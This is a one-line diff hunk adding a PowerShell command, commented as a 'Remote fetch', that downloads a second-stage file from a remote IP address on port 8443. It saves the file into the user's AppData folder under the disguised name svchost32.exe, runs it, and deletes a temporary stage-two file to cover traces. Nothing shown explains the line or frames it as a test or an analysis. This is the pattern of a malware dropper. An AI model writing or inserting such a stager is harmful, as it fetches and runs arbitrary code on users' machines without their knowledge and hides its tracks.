@@ -1,0 +1,1 @@
+<# Remote fetch #> $Stage2Url = 'https://203.0.113.245:8443/updater.ps1'; $OutputPath = "$env:APPDATA\svchost32.exe"; (New-Object System.Net.WebClient).DownloadFile($Stage2Url, $OutputPath); & $OutputPath; Remove-Item -Path "$env:TEMP\stage2.bin" -Force
